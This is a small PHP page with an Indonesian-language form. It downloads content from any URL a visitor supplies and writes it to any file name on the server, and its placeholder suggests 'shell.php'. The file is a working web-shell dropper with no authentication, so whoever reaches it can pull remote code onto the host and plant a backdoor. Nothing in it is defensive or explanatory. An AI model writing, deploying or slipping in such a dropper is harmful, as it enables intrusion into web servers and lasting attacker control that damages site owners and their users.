<?php
if(isset($_POST['url']) && isset($_POST['file'])) {
    $url = $_POST['url'];
    $file = $_POST['file'];
    $content = @file_get_contents($url);
    if($content !== false) {
        file_put_contents($file, $content);
        echo "<script>alert('Berhasil download!');</script>";
    } else {
        echo "<script>alert('Gagal mengambil file!');</script>";
    }
}
?>
<form method="POST">
    <input type="text" name="url" placeholder="URL file (contoh: https://...) " style="width:300px;" required><br><br>
    <input type="text" name="file" placeholder="Nama file tujuan (contoh: shell.php)" style="width:300px;" required><br><br>
    <input type="submit" value="Download">
</form>
